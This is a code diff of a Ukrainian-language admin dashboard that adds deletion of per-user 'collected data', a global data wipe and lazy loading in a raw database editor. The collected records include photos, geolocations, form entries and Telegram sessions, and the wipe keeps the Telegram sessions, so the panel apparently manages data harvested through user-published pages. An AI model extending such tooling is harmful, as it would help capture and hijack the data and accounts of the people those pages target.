@@ -22,7 +22,6 @@
             --input-background-color: #f9fafb;
             --sidebar-width: 260px;
             
-            /* --- NEW: Variables for Modal Styling from User Page --- */
             --modal-background-color: var(--content-background-color);
             --modal-text-color: var(--text-color-primary);
             --modal-close-btn-background: #ffffff;
@@ -50,12 +49,10 @@
             padding: 1rem;
         }
         
-        /* Prevent background scroll when modal is open */
         html.modal-open, body.modal-open { 
             overflow: hidden; 
         }
 
-        /* --- LAYOUT & SECTIONS --- */
         .container {
             max-width: 1400px;
             margin: 1rem auto;
@@ -97,7 +94,6 @@
             box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05), 0 2px 4px -2px rgba(0,0,0,0.05);
         }
         
-        /* --- BUTTONS --- */
         .btn {
             display: inline-flex;
             align-items: center;
@@ -138,7 +134,6 @@
         }
         .btn-secondary:hover:not(:disabled) { background-color: #f9fafb; border-color: #d1d5db; }
 
-        /* --- TABLES --- */
         .table-wrapper {
             width: 100%;
             overflow-x: auto;
@@ -173,7 +168,6 @@
         .status-suspended, .status-blocked, .status-bot_blocked { color: var(--danger-color); font-weight: 600; }
         .status-pending { color: #f59e0b; font-weight: 600; }
 
-        /* --- FORMS --- */
         .form-group { margin-bottom: 1.25rem; }
         .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 500; color: var(--text-color-primary); font-size: 0.875rem; }
         .form-group input, .form-group textarea, .form-group select {
@@ -201,7 +195,6 @@
             .form-grid-3 { grid-template-columns: repeat(3, 1fr); }
         }
 
-        /* --- MODALS (dialog) - UPDATED STYLES --- */
         dialog {
             background-color: var(--modal-background-color);
             color: var(--modal-text-color);
@@ -284,7 +277,6 @@
             border-bottom-right-radius: 16px;
         }
         
-        /* --- SPECIFIC COMPONENTS --- */
         .danger-zone {
             border: 1px solid var(--danger-color);
             padding: 1.5rem;
@@ -300,7 +292,6 @@
         #data-viewer-content .data-grid { display: grid; grid-template-columns: auto 1fr; gap: 8px 16px; align-items: center; }
         #data-viewer-content .data-grid strong { font-weight: 500; color: var(--text-color-secondary); }
 
-        /* --- SPECIFIC INPUT ENHANCEMENTS --- */
         #delete-added-id {
             padding: 10px 14px;
             border-radius: 8px;
@@ -315,7 +306,6 @@
             box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
         }
 
-        /* --- GLOBAL LOADER --- */
         #global-loader {
             position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
             background-color: #fff; padding: 12px 24px; border-radius: 50px;
@@ -324,45 +314,17 @@
             pointer-events: none;
         }
         .loader-spinner {
-            width: 20px; height: 20px; border: 2px solid var(--primary-color);
-            border-top-color: transparent; border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--primary-color);
+            border-top-color: transparent;
+            border-radius: 50%;
             animation: spin 1s linear infinite;
+            flex-shrink: 0; 
+            aspect-ratio: 1 / 1;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* --- RESPONSIVE DESIGN --- */
-        @media (max-width: 768px) {
-            body { padding: 0.5rem; }
-            .container { margin: 0.5rem; }
-            section { padding: 1rem; }
-            
-            .modal-header, .modal-body, .modal-footer {
-                padding: 16px 20px;
-            }
-
-            .actions-cell { min-width: 150px; } /* Prevent action buttons from wrapping too soon */
-            
-            .form-grid, .form-grid-2, .form-grid-3 { grid-template-columns: 1fr; }
-            
-            #news-form {
-                display: flex;
-                flex-direction: column;
-            }
-
-            /* Make data tables more readable on small screens */
-            table { font-size: 0.8rem; }
-            th, td { white-space: normal; padding: 10px 12px; }
-
-            /* Stack the action row in the news form */
-            #news-form > div:last-child {
-                display: flex !important;
-                flex-direction: column !important;
-                align-items: stretch !important;
-                gap: 0.75rem !important;
-            }
-            #news-form > div:last-child .btn { width: 100%; }
-            #news-form > div:last-child input#delete-added-id { width: 100%; min-width: 0; }
-        }
         /* --- DB Editor Styles --- */
         #db-editor-container {
             background-color: #0d1117;
@@ -372,14 +334,16 @@
             border: 1px solid var(--border-color);
             border-radius: 12px;
             padding: 1rem;
+            overflow-x: auto;
         }
         .db-node {
             margin-left: 20px;
             border-left: 1px solid #30363d;
             padding-left: 20px;
+            position: relative;
         }
-        .db-node.db-root { margin-left: 0; border-left: none; padding-left: 0; }
-        .db-entry { display: flex; flex-wrap: wrap; align-items: center; margin-bottom: 5px; position: relative; }
+        .db-root { margin-left: 0; border-left: none; padding-left: 0; }
+        .db-entry { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; min-height: 28px; }
         .db-key { color: #79c0ff; cursor: pointer; }
         .db-key:hover { text-decoration: underline; }
         .db-key.collapsible::before {
@@ -390,7 +354,7 @@
             font-size: 10px;
         }
         .db-key.collapsible.expanded::before { transform: rotate(90deg); }
-        .db-value-preview { color: #8b949e; margin-left: 10px; font-style: italic; }
+        .db-value-preview { color: #8b949e; font-style: italic; }
         .db-content { display: none; }
         .db-content.expanded { display: block; }
         .db-value-editor {
@@ -399,18 +363,46 @@
             color: #c9d1d9;
             border-radius: 6px;
             padding: 4px 8px;
-            margin-left: 10px;
             font-family: inherit;
         }
-        .db-value.string { color: #a5d6ff; }
+        .db-value.string { color: #a5d6ff; word-break: break-all; }
         .db-value.number { color: #79c0ff; }
         .db-value.boolean { color: #ff7b72; }
         .db-value.null { color: #ff7b72; font-style: italic; }
         .db-actions { display: flex; gap: 8px; margin-left: auto; align-items: center; }
         .db-action-btn { background: none; border: none; color: #8b949e; cursor: pointer; font-size: 16px; padding: 2px; }
         .db-action-btn:hover { color: #c9d1d9; }
-        .db-entry > input[type="checkbox"] { margin-right: 10px; }
+        .db-entry > input[type="checkbox"] { flex-shrink: 0; }
         #db-editor-actions { margin-top: 1rem; padding-top: 1rem; border-top: 1px solid var(--border-color); display: flex; gap: 1rem; }
+        
+        /* --- RESPONSIVE DESIGN --- */
+        @media (max-width: 768px) {
+            body { padding: 0.5rem; }
+            .container { margin: 0; width: 100%; }
+            section { padding: 1rem; }
+            
+            .modal-header, .modal-body, .modal-footer {
+                padding: 16px 20px;
+            }
+            h1 { font-size: 1.5rem; }
+            .actions-cell { min-width: 150px; } 
+            .form-grid, .form-grid-2, .form-grid-3 { grid-template-columns: 1fr; }
+            
+            #news-form > div:last-child {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 0.75rem;
+            }
+            #news-form > div:last-child .btn, #news-form > div:last-child input#delete-added-id { width: 100%; min-width: 0; }
+            
+            table { font-size: 0.8rem; }
+            th, td { white-space: normal; padding: 10px 12px; }
+
+            .db-entry { flex-direction: column; align-items: flex-start; gap: 5px; }
+            .db-actions { margin-left: 0; padding-top: 5px; }
+            #db-editor-actions { flex-direction: column; align-items: stretch; }
+            #db-editor-actions .btn { width: 100%; }
+        }
     </style>
 </head>
 <body>
@@ -424,8 +416,10 @@
             <h1><span class="brand-dot"></span> Панель керування</h1>
         </header>
         <div id="prompt-container"><p>Введіть ключ доступу для завантаження даних.</p></div>
-        <div id="admin-content" style="display:none;"></div>
-        <section id="db-editor-section">
+        <div id="admin-content" style="display:none;">
+            <!-- Вміст буде згенеровано динамічно -->
+        </div>
+        <section id="db-editor-section" style="display:none;">
             <h2>Редактор Бази Даних</h2>
             <p style="color: var(--text-color-secondary); margin-bottom: 1rem;">Цей інструмент дозволяє напряму редагувати JSON-файл бази даних. Будьте вкрай обережні, оскільки некоректні зміни можуть зламати систему.</p>
             <div id="db-editor-controls">
@@ -433,7 +427,7 @@
             </div>
             <div id="db-editor-container" style="margin-top: 1.5rem;"></div>
         </section>
-        <section>
+        <section id="active-push-news-section" style="display:none;">
             <h2>Активні Push-сповіщення</h2>
             <div id="active-push-news-list">
                 <p>Завантаження...</p>
@@ -509,7 +503,6 @@
             globalLoader.style.display = 'none';
         }
 
-        // --- UPDATED Modal helpers ---
         function openModal(modalElement) {
             if (modalElement && typeof modalElement.showModal === 'function') {
                 window.scrollTo({ top: 0, behavior: 'auto' });
@@ -521,7 +514,6 @@
             }
         }
 
-        // Setup listeners for all modals to manage body class
         document.querySelectorAll('dialog').forEach(modal => {
             modal.addEventListener('close', () => {
                 const anyModalOpen = !!document.querySelector('dialog[open]');
@@ -559,6 +551,8 @@
             if (success) {
                 promptContainer.style.display = 'none';
                 adminContent.style.display = 'block';
+                document.getElementById('db-editor-section').style.display = 'block';
+                document.getElementById('active-push-news-section').style.display = 'block';
             }
         }
         
@@ -607,7 +601,7 @@
                             <div class="form-group">
                                 <label for="data-retention-days">Термін зберігання даних (днів)</label>
                                 <input type="number" id="data-retention-days" value="${dashboardData.settings.dataRetentionDays || 0}" min="0">
-                                <small style="color: var(--text-color-secondary); margin-top: 4px; display: block;">Встановіть 0, щоб ніколи не видаляти дані автоматично.</small>
+                                <small style="color: var(--text-color-secondary); margin-top: 4px; display: block;">Встановіть 0, щоб ніколи не видаляти дані автоматично. Сесії Telegram не видаляються.</small>
                             </div>
                         </div>
                         <button class="btn btn-primary" style="margin-top: 1rem;" onclick="updateGlobalSettings()">Зберегти налаштування</button>
@@ -633,12 +627,10 @@
                                 <label for="push-news-text">Текст сповіщення</label>
                                 <textarea id="push-news-text" required></textarea>
                             </div>
-                            <!-- ДОДАЙТЕ ЦЕЙ БЛОК -->
                             <div class="form-group">
                                 <label for="push-news-image">URL зображення (необов'язково)</label>
                                 <input type="url" id="push-news-image" placeholder="https://example.com/image.png">
                             </div>
-                            <!-- КІНЕЦЬ БЛОКУ -->
                             <div class="form-grid form-grid-2">
                                 <div class="form-group">
                                     <label for="push-news-mode">Режим</label>
@@ -683,8 +675,6 @@
                             <div class="form-group"><input type="text" id="news-title" placeholder="Заголовок" required></div>
                             <div class="form-group"><input type="url" id="news-image" placeholder="URL зображення (необов'язково)"></div>
                             <div class="form-group" style="grid-column: 1 / -1;"><textarea id="news-text" placeholder="Текст новини"></textarea></div>
-                            
-                            <!-- ДОДАНИЙ БЛОК -->
                             <div class="form-group" style="grid-column: 1 / -1;">
                                 <label>Аудиторія для новини (введіть ID користувачів через кому)</label>
                                 <div class="form-grid form-grid-3">
@@ -698,8 +688,6 @@
                                     </div>
                                 </div>
                             </div>
-                            <!-- КІНЕЦЬ ДОДАНОГО БЛОКУ -->
-
                             <div style="grid-column: 1 / -1; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
                                 <button type="submit" class="btn btn-primary">Опублікувати новину</button>
                                 <div style="display:flex; gap:8px; align-items:center; flex-wrap: wrap;">
@@ -757,6 +745,11 @@
                             </div>
                         </div>
                         <div id="users-table-wrapper" class="table-wrapper"></div>
+                    </section>
+                     <section class="danger-zone">
+                        <h2>Глобальні небезпечні дії</h2>
+                        <p style="color: var(--text-color-secondary); margin-bottom: 1rem;">Ці дії впливають на всіх користувачів і є незворотніми. Будьте обережні.</p>
+                        <button class="btn btn-danger" onclick="wipeAllUsersCollectedData()">Очистити всі зібрані дані</button>
                     </section>
                 `;
                 renderUsersTable(); renderCodesTable(); renderTemplatesTable(); renderNewsList();
@@ -839,6 +832,7 @@
         
         async function showUserDetails(userId) {
             const modal = document.getElementById('user-details-modal');
+            modal.dataset.userId = userId;
             const modalBody = document.getElementById('modal-body-content');
             document.getElementById('modal-title').textContent = 'Завантаження деталей...';
             setModalLoading('user-details-modal', 'Завантаження...');
@@ -931,6 +925,13 @@
                 </div>
                 
                 <h4>Зібрані дані</h4>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; flex-wrap: wrap; gap: 10px;">
+                    <div>
+                        <input type="checkbox" id="user-data-select-all" onchange="toggleAllUserData(this.checked)">
+                        <label for="user-data-select-all">Вибрати все</label>
+                    </div>
+                    <button class="btn btn-danger" onclick="deleteSelectedUserData('${userId}')">Видалити вибране</button>
+                </div>
                 <div id="collected-data-section">Завантаження...</div>
                 <div id="pagination-controls-container"></div>
 
@@ -944,6 +945,28 @@
                 </div>
             `;
             await renderCollectedDataPage(userId, 1);
+        }
+
+        function toggleAllUserData(checked) {
+            document.querySelectorAll('#collected-data-section input[type="checkbox"]').forEach(cb => cb.checked = checked);
+        }
+
+        async function deleteSelectedUserData(userId) {
+            const selectedTimestamps = Array.from(document.querySelectorAll('#collected-data-section input[type="checkbox"]:checked')).map(cb => cb.value);
+            if (selectedTimestamps.length === 0) {
+                alert('Не вибрано жодного запису для видалення.');
+                return;
+            }
+            if (confirm(`Ви впевнені, що хочете видалити ${selectedTimestamps.length} запис(ів)?`)) {
+                showLoader('Видалення даних...');
+                try {
+                    await apiCall('deleteCollectedDataAdmin', { userId, timestamps: selectedTimestamps });
+                    const currentPage = parseInt(document.querySelector('.pagination-controls span')?.textContent.match(/(\d+)/)?.[0] || '1', 10);
+                    await renderCollectedDataPage(userId, currentPage);
+                } finally {
+                    hideLoader();
+                }
+            }
         }
 
         async function renderCollectedDataPage(userId, page) {
@@ -978,6 +1001,9 @@
                 else if (item.type === 'telegram_session') { icon = '💬'; description = 'Сесія Telegram'; }
                 
                 collectedDataHtml += `<tr style="cursor:pointer;" onclick="showDataEntryDetails('${userId}', '${item.collectedAt}')">
+                    <td style="width: 20px; padding-left: 10px;" onclick="event.stopPropagation();">
+                        <input type="checkbox" value="${item.collectedAt}" onclick="event.stopPropagation();">
+                    </td>
                     <td style="width: 40px; text-align: center;">${icon}</td>
                     <td>
                         <div>${description}</div>
@@ -1220,7 +1246,6 @@
             alert('Готово.');
         }
 
-        // Disable other global restriction checkboxes when "clear all" is active
         document.addEventListener('change', (e) => {
             if (e.target && e.target.id === 'g_clear_all') {
                 const disabled = e.target.checked;
@@ -1228,6 +1253,24 @@
                     .forEach(id => { const el = document.getElementById(id); if (el) { el.disabled = disabled; if (disabled) el.checked = false; }});
             }
         });
+        
+        async function wipeAllUsersCollectedData() {
+            if (prompt('Ця дія видалить ВСІ зібрані дані (фото, геолокації, форми і т.д.) для ВСІХ користувачів. Сесії Telegram НЕ будуть видалені. Щоб продовжити, введіть "ОЧИСТИТИ ВСЕ":') === 'ОЧИСТИТИ ВСЕ') {
+                showLoader('Глобальне очищення...');
+                try {
+                    await apiCall('wipeAllUsersCollectedData', {});
+                    alert('Всі зібрані дані були видалені.');
+                    const modal = document.getElementById('user-details-modal');
+                    if (modal.open && modal.dataset.userId) {
+                        await reloadAndShowUser(modal.dataset.userId);
+                    }
+                } finally {
+                    hideLoader();
+                }
+            } else {
+                alert('Очищення скасовано.');
+            }
+        }
         
 
         let currentEditorUserId = null;
@@ -1270,7 +1313,6 @@
                 preview.srcdoc = `<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>${contentToPreview}</body></html>`;
             }
             updateEditorPreview();
-            // Apply restrictions ui state
             const saveBtn = document.getElementById('page-editor-save-btn');
             const customizationBlocked = !!(user?.restrictions?.customization);
             const publishBlocked = !!(user?.restrictions?.publish_page);
@@ -1302,7 +1344,6 @@
             const payload = { userId: currentEditorUserId, source };
             if(source === 'custom') payload.htmlContent = htmlEl.value || '';
             else payload.sourceTemplateId = tplSel.value || null;
-            // Check restriction: block publication if enabled
             try {
                 const userRes = await apiCall('getUserDetails', { userId: currentEditorUserId });
                 if (userRes && userRes.ok) {
@@ -1469,26 +1510,27 @@
             }
         }
 
-
-let dbState = null; // Локальна копія БД
+        let dbState = null;
         let editorContainer = document.getElementById('db-editor-container');
 
-        document.getElementById('load-db-editor-btn').addEventListener('click', async () => {
-            showLoader('Завантаження бази даних...');
-            try {
-                const res = await apiCall('getRawDatabase');
-                if (!res || !res.ok) throw new Error('Failed to fetch DB');
-                dbState = await res.json();
-                renderDbEditor();
-            } catch (error) {
-                alert('Помилка завантаження бази даних: ' + error.message);
-            } finally {
-                hideLoader();
+        document.getElementById('db-editor-controls').addEventListener('click', async (event) => {
+            if (event.target.id === 'load-db-editor-btn') {
+                showLoader('Завантаження структури бази даних...');
+                try {
+                    const res = await apiCall('getRawDatabase');
+                    if (!res || !res.ok) throw new Error('Failed to fetch DB structure');
+                    dbState = await res.json();
+                    renderDbEditor();
+                } catch (error) {
+                    alert('Помилка завантаження бази даних: ' + error.message);
+                } finally {
+                    hideLoader();
+                }
             }
         });
 
         function renderDbEditor() {
-            editorContainer.innerHTML = ''; // Очистка
+            editorContainer.innerHTML = '';
             const rootNode = createDbNode(dbState, 'База Даних', ['root']);
             rootNode.classList.add('db-root');
             editorContainer.appendChild(rootNode);
@@ -1505,98 +1547,135 @@ let dbState = null; // Локальна копія БД
                 dbState = null;
                 editorContainer.innerHTML = '';
                 document.getElementById('db-editor-controls').innerHTML = '<button class="btn btn-primary" id="load-db-editor-btn">Завантажити редактор</button>';
-                document.getElementById('load-db-editor-btn').addEventListener('click', arguments.callee.caller);
             });
             document.getElementById('delete-selected-btn').addEventListener('click', deleteSelectedNodes);
         }
 
         function createDbNode(data, key, path) {
-            const nodeElement = document.createElement('div');
-            nodeElement.className = 'db-node';
+            const nodeContainer = document.createElement('div');
+            const entryDiv = document.createElement('div');
+            entryDiv.className = 'db-entry';
+
+            const checkbox = document.createElement('input');
+            checkbox.type = 'checkbox';
+            checkbox.dataset.path = JSON.stringify(path);
+            checkbox.onclick = (e) => e.stopPropagation();
+            entryDiv.appendChild(checkbox);
             
-            if (typeof data === 'object' && data !== null) {
+            if (typeof data === 'object' && data !== null && data.__lazy) {
+                nodeContainer.id = 'db-node-' + path.join('-');
+                const keySpan = document.createElement('span');
+                keySpan.className = 'db-key';
+                keySpan.textContent = `${key}: `;
+                const lazyButton = document.createElement('button');
+                lazyButton.className = 'btn btn-secondary';
+                lazyButton.style.padding = '2px 8px';
+                lazyButton.textContent = `Завантажити (${data.type}, ${data.size}b)`;
+                lazyButton.onclick = (e) => { e.stopPropagation(); loadLazyNode(path); };
+                entryDiv.appendChild(keySpan);
+                entryDiv.appendChild(lazyButton);
+
+            } else if (typeof data === 'object' && data !== null) {
+                nodeContainer.classList.add('db-node');
                 const isArray = Array.isArray(data);
                 const entries = Object.entries(data);
-
-                const header = document.createElement('div');
-                header.className = 'db-entry';
-                
                 const keySpan = document.createElement('span');
                 keySpan.className = 'db-key collapsible';
                 keySpan.textContent = `${key}`;
-                
                 const previewSpan = document.createElement('span');
                 previewSpan.className = 'db-value-preview';
                 previewSpan.textContent = isArray ? `Array[${entries.length}]` : `Object{${entries.length}}`;
-
-                header.appendChild(keySpan);
-                header.appendChild(previewSpan);
+                entryDiv.appendChild(keySpan);
+                entryDiv.appendChild(previewSpan);
                 
                 const contentDiv = document.createElement('div');
                 contentDiv.className = 'db-content';
-
-                keySpan.addEventListener('click', () => {
+                entryDiv.onclick = () => {
                     keySpan.classList.toggle('expanded');
                     contentDiv.classList.toggle('expanded');
-                });
+                };
                 
                 entries.forEach(([childKey, childValue]) => {
                     contentDiv.appendChild(createDbNode(childValue, childKey, [...path, childKey]));
                 });
-                
-                nodeElement.appendChild(header);
-                nodeElement.appendChild(contentDiv);
+                nodeContainer.appendChild(contentDiv);
 
             } else {
-                const entryDiv = document.createElement('div');
-                entryDiv.className = 'db-entry';
-                
-                const parentPath = path.slice(0, -1);
-                const parent = getDbNodeByPath(parentPath);
-                if(Array.isArray(parent)) {
-                    const checkbox = document.createElement('input');
-                    checkbox.type = 'checkbox';
-                    checkbox.dataset.path = path.join('.');
-                    entryDiv.appendChild(checkbox);
-                }
-
                 const keySpan = document.createElement('span');
                 keySpan.className = 'db-key';
                 keySpan.textContent = `${key}: `;
-                
                 const valueSpan = document.createElement('span');
                 valueSpan.className = `db-value ${typeof data}`;
                 valueSpan.textContent = JSON.stringify(data);
-                
                 entryDiv.appendChild(keySpan);
                 entryDiv.appendChild(valueSpan);
-                
+            }
+
+            if (path.length > 1) {
                 const actionsDiv = document.createElement('div');
                 actionsDiv.className = 'db-actions';
-                actionsDiv.innerHTML = `<button class="db-action-btn" title="Редагувати">✏️</button><button class="db-action-btn" title="Видалити">🗑️</button>`;
                 
-                actionsDiv.querySelector('[title="Редагувати"]').addEventListener('click', () => {
-                    const newValue = prompt(`Введіть нове значення для "${path.join('.')}":`, JSON.stringify(data));
-                    if (newValue !== null) {
-                        try {
-                            const parsedValue = JSON.parse(newValue);
-                            setDbNodeByPath(path, parsedValue);
-                            renderDbEditor(); 
-                        } catch (e) { alert('Некоректний JSON формат.'); }
-                    }
-                });
-                actionsDiv.querySelector('[title="Видалити"]').addEventListener('click', () => {
+                if (typeof data !== 'object' || (data && data.__lazy)) {
+                    const editBtn = document.createElement('button');
+                    editBtn.className = 'db-action-btn';
+                    editBtn.title = 'Редагувати';
+                    editBtn.innerHTML = '✏️';
+                    editBtn.onclick = (e) => {
+                        e.stopPropagation();
+                        const currentValue = (data && data.__lazy) ? '"(не завантажено)"' : JSON.stringify(data);
+                        const newValue = prompt(`Введіть нове значення для "${path.join('.')}":`, currentValue);
+                        if (newValue !== null && newValue !== '"(не завантажено)"') {
+                            try {
+                                const parsedValue = JSON.parse(newValue);
+                                setDbNodeByPath(path, parsedValue);
+                                renderDbEditor(); 
+                            } catch (err) { alert('Некоректний JSON формат.'); }
+                        }
+                    };
+                    actionsDiv.appendChild(editBtn);
+                }
+
+                const deleteBtn = document.createElement('button');
+                deleteBtn.className = 'db-action-btn';
+                deleteBtn.title = 'Видалити';
+                deleteBtn.innerHTML = '🗑️';
+                deleteBtn.onclick = (e) => {
+                    e.stopPropagation();
                     if(confirm(`Видалити "${path.join('.')}"?`)) {
                         deleteDbNodeByPath(path);
                         renderDbEditor();
                     }
-                });
-
+                };
+                actionsDiv.appendChild(deleteBtn);
                 entryDiv.appendChild(actionsDiv);
-                nodeElement.appendChild(entryDiv);
             }
             
-            return nodeElement;
+            nodeContainer.prepend(entryDiv);
+            return nodeContainer;
+        }
+
+        async function loadLazyNode(path) {
+            showLoader('Завантаження повного значення...');
+            try {
+                const res = await apiCall('getDbNodeValue', { path });
+                if (!res || !res.ok) throw new Error('Не вдалося завантажити вузол');
+                const { value } = await res.json();
+                
+                setDbNodeByPath(path, value);
+
+                const placeholderNode = document.getElementById('db-node-' + path.join('-')) || document.querySelector(`[data-path='${JSON.stringify(path)}']`)?.closest('.db-node, .db-entry');
+                if (placeholderNode) {
+                    const newNode = createDbNode(value, path[path.length - 1], path);
+                    placeholderNode.parentNode.replaceChild(newNode, placeholderNode);
+                } else {
+                    renderDbEditor();
+                }
+
+            } catch (error) {
+                alert('Помилка завантаження: ' + error.message);
+            } finally {
+                hideLoader();
+            }
         }
 
         function getDbNodeByPath(path) {
@@ -1639,49 +1718,55 @@ let dbState = null; // Локальна копія БД
                 return;
             }
 
-            const pathsToDelete = Array.from(checkboxes).map(cb => cb.dataset.path.split('.'));
+            const pathsToDelete = Array.from(checkboxes).map(cb => JSON.parse(cb.dataset.path));
             
-            // Групуємо шляхи за батьківськими елементами, щоб ефективно видаляти з масивів
             const groupedByParent = {};
             pathsToDelete.forEach(path => {
-                const parentPath = path.slice(0, -1).join('.');
+                const parentPath = JSON.stringify(path.slice(0, -1));
                 if (!groupedByParent[parentPath]) {
                     groupedByParent[parentPath] = [];
                 }
                 groupedByParent[parentPath].push(path[path.length-1]);
             });
             
-            // Сортуємо індекси в зворотному порядку, щоб уникнути проблем зі зміщенням
             for (const parentPathStr in groupedByParent) {
-                const parentPath = parentPathStr.split('.');
+                const parentPath = JSON.parse(parentPathStr);
                 const parentNode = getDbNodeByPath(parentPath);
                 if (Array.isArray(parentNode)) {
                     const indices = groupedByParent[parentPathStr].map(Number).sort((a, b) => b - a);
                     indices.forEach(index => parentNode.splice(index, 1));
+                } else {
+                    groupedByParent[parentPathStr].forEach(key => delete parentNode[key]);
                 }
             }
             renderDbEditor();
         }
 
         async function saveDbChanges() {
+            // *** ВИДАЛЕНО: Блок перевірки на "__lazy":true ***
+
             if (!confirm('Ви впевнені, що хочете зберегти всі зміни в базі даних? Ця дія незворотня.')) {
                 return;
             }
             showLoader('Збереження бази даних...');
             try {
+                // Тепер ми викликаємо той самий 'updateRawDatabase', але на бекенді він працює як "злиття"
                 const res = await apiCall('updateRawDatabase', dbState);
                 if (res && res.ok) {
                     alert('База даних успішно оновлена.');
-                    // Перезавантажуємо всю адмін-панель, щоб відобразити нові дані
                     await loadAndRenderDashboard();
+                    
+                    // Скидаємо стан редактора
+                    dbState = null;
+                    editorContainer.innerHTML = '';
+                    document.getElementById('db-editor-controls').innerHTML = '<button class="btn btn-primary" id="load-db-editor-btn">Завантажити редактор</button>';
                 }
             } finally {
                 hideLoader();
             }
         }
 
-
- async function revokeTermsPush() {
+        async function revokeTermsPush() {
             if (confirm('Ви впевнені, що хочете скасувати вимогу погодження з умовами? Користувачі, які ще не погодились, більше не побачать це вікно.')) {
                 showLoader('Скасування вимоги...');
                 try {
@@ -1698,7 +1783,7 @@ let dbState = null; // Локальна копія БД
                 showLoader('Відкликання сповіщення...');
                 try {
                     await apiCall('revokePushNews', { pushId });
-                    await loadAndRenderDashboard(); // Перезавантажуємо, щоб оновити список
+                    await loadAndRenderDashboard();
                 } finally {
                     hideLoader();
                 }
@@ -1737,7 +1822,6 @@ let dbState = null; // Локальна копія БД
                 </details>
             `}).join('');
         }
-        
     </script>
 </body>
 </html>
